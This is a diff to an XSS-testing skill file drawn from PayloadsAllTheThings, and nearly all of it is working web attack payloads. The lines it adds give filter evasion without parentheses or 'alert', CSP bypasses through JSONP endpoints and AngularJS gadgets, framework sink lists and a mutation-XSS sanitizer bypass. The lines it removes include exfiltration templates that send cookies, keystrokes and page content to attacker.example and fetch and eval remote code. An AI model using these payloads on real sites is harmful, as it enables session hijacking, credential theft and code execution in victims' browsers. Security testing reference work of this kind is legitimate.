@@ -1,5 +1,5 @@
 ---
-description: DOM XSS, reflected, stored, filter bypass, CSP bypass, polyglots
+description: Filter evasion without parentheses or alert, CSP bypass gadgets, framework sinks, polyglots, mutation XSS
 skill: xss-testing
 source: PayloadsAllTheThings — XSS Injection
 source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
@@ -10,156 +10,30 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 
 > Source: PayloadsAllTheThings — XSS Injection
 
-## Basic Payloads
-
-```html
-<script>alert('XSS')</script>
-<script>alert(document.domain)</script>
-<script>alert(document.cookie)</script>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<details open ontoggle=alert(1)>
-<body onload=alert(1)>
-```
-
-## HTML Context Injection
-
-```html
-"><script>alert('XSS')</script>
-"><img src=x onerror=alert(1)>
-<><img src=1 onerror=alert(1)>
-</title><script>alert(1)</script>
-</textarea><script>alert(1)</script>
-</style><script>alert(1)</script>
-```
-
-## Attribute Context
-
-```html
-" onfocus=alert(1) autofocus="
-" onmouseover=alert(1) "
-' onfocus=alert(1) autofocus='
-<img src=x onerror=alert('XSS')>
-<img src=x onerror=alert('XSS')//
-<img src=x:alert(alt) onerror=eval(src) alt=xss>
-<input type="hidden" accesskey="X" onclick="alert(1)">
-<input onfocus=alert(1) autofocus>
-```
-
-### href/src Attribute Injection
-
-```html
-<a href="javascript:alert(1)">click</a>
-<a href="data:text/html,<script>alert(1)</script>">click</a>
-<iframe src="javascript:alert(1)">
-```
-
-## JavaScript Context
-
-```javascript
-'-alert(1)-'
-';alert(1)//
-\';alert(1)//
--(confirm)(document.domain)//
-</script><script>alert(1)</script>
-```
-
-## DOM XSS — Common Sinks
-
-### innerHTML
-
-```javascript
-#"><img src=/ onerror=alert(2)>
-<svg/onload=alert(1)>
-```
-
-### eval / setTimeout / setInterval
-
-```javascript
-';alert(1)//
-\u0061lert(1)
-```
-
-### document.write
-
-```javascript
-"></script><script>alert(1)</script>
-```
-
-### location / location.href / location.replace
-
-```javascript
-javascript:alert(document.domain)
-data:text/html,<script>alert(1)</script>
-```
-
-## Stored XSS Vectors
-
-### SVG Upload
-
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
-<svg><script>alert(1)</script></svg>
-```
-
-### Markdown Injection
-
-```markdown
-[clickme](javascript:alert(1))
-![img](x onerror=alert(1))
-```
-
 ## Filter Bypass Techniques
-
-### Encoding Bypasses
-
-```
-// Hex encoding
-\x3cscript\x3ealert(1)\x3c/script\x3e
-
-// Unicode encoding
-\u003cscript\u003ealert(1)\u003c/script\u003e
-
-// URL encoding in href
-<a href="j&#x61;vascript:alert(1)">click</a>
-
-// HTML entity encoding
-<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
-
-// Newline insertion
-java%0ascript:alert(1)
-java%09script:alert(1)
-java%0dscript:alert(1)
-```
 
 ### Tag Alternatives
 
 ```html
-<svg/onload=alert('XSS')>
-<details/open/ontoggle="alert(1)">
-<video poster=x onerror=alert(1)>
-<marquee onstart=alert(1)>
-<div onpointerover="alert(1)">hover</div>
-<body ontouchstart=alert(1)>
+<input type="hidden" accesskey="X" onclick="alert(1)">
 <input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
 ```
 
-### Event Handler Alternatives
+### Without Parentheses or `alert`
 
-```
-onload, onerror, onfocus, onblur, onmouseover, onclick
-ontoggle, onstart, onpointerover, ontouchstart
-onanimationend, onwebkittransitionend
-oncontentvisibilityautostatechange
-```
-
-### Case and Concatenation
+Many WAF rules key on `(`/`)` in handler values or on the word `alert`:
 
 ```html
-<ScRiPt>alert(1)</ScRiPt>
-<scr<script>ipt>alert(1)</scr</script>ipt>
-<script>eval(atob('YWxlcnQoMSk='))</script>
-<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=alert`1`>
+<img src=x onerror="window.onerror=alert;throw 1">
+<img src=x onerror="location='javascript:alert%281%29'">
+<svg onload="import('data:text/javascript,alert(1)')">
+```
+
+```javascript
+window['al'+'ert'](1)
+print()                          // opens the print dialog: proves execution without alert
+[].constructor.constructor('alert(1)')()
 ```
 
 ## CSP Bypass
@@ -176,11 +50,38 @@ oncontentvisibilityautostatechange
 
 <!-- JSONP endpoint on whitelisted domain -->
 <script src="https://whitelisted.com/jsonp?callback=alert(1)//"></script>
+<!-- e.g. script-src allows accounts.google.com -->
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
 
 <!-- Trusted Types bypass via default policy -->
 <!-- Angular: template injection if ng-app present -->
 {{constructor.constructor('alert(1)')()}}
+
+<!-- AngularJS 1.x sandbox escape (some payload works for every 1.x version; pick by version) -->
+{{$on.constructor('alert(1)')()}}
+
+<!-- script-src allows a CDN that hosts angular.js: load it and use CSP-compatible mode.
+     AngularJS evaluates expressions itself, so no unsafe-eval is needed. -->
+<script src="https://<allowed-cdn>/angular.min.js"></script>
+<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
 ```
+
+Also check: `Content-Security-Policy-Report-Only` does not enforce; with no `script-src` the
+policy falls back to `default-src`, and with neither there is no script restriction; `unsafe-eval`
+present often means AngularJS is in use.
+
+## Framework Sinks (escape hatches)
+
+| Framework | Sink | Note |
+|-----------|------|------|
+| React | `dangerouslySetInnerHTML`, `ref.current.innerHTML`, `href={userUrl}` with `javascript:` | Older React only warns on `javascript:` URLs; confirm the version. |
+| Angular | `bypassSecurityTrustHtml/Url/ResourceUrl` then `[innerHTML]`/`[src]` binding | `[innerHTML]` is sanitised unless the bypass is applied first; SSR template compilation of user input (`{{constructor.constructor('alert(1)')()}}`) is rare but critical. |
+| AngularJS 1.x | any `{{ }}` interpolation of user input | Sandbox escapes exist for every version (above). |
+| Vue | `v-html`, runtime template compile (`new Vue({template: userInput})`) | |
+| jQuery | `.html()`, `.append()`, `$(userInput)` | `$()` parses HTML when the string starts with `<`. |
+| Markdown | renderers with raw HTML enabled (`rehypeRaw`, `html: true`) | |
+| Next.js / Nuxt | SSR hydration from a different source than the server render (`getServerSideProps` vs `useSearchParams`; Nuxt `asyncData`/`useFetch`) | |
+| postMessage | handlers that write `event.data` to a sink without checking `event.origin` | |
 
 ## Polyglot Payloads
 
@@ -196,18 +97,14 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
 ```
 
-## Data Exfiltration Templates
+### Mutation XSS (sanitizer bypass)
 
-```javascript
-// Cookie theft
-<script>fetch('https://attacker.example/?c='+document.cookie)</script>
+Namespace confusion between HTML, MathML and SVG makes the sanitizer's parse differ from the
+browser's re-parse; the DOMPurify-class bypass shape:
 
-// Keylogger
-<script>document.onkeypress=function(e){fetch('https://attacker.example/?k='+e.key)}</script>
-
-// Full page content
-<script>fetch('https://attacker.example/',{method:'POST',body:document.body.innerHTML})</script>
-
-// Credential harvesting via fake login
-<svg/onload="fetch('https://attacker.example/collect').then(r=>r.text().then(t=>eval(t)))">
+```html
+<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)>">
 ```
+
+Try it against server-side or outdated client-side sanitizers; current DOMPurify releases patch
+the known chains, so a hit usually means an old version or a custom sanitizer.
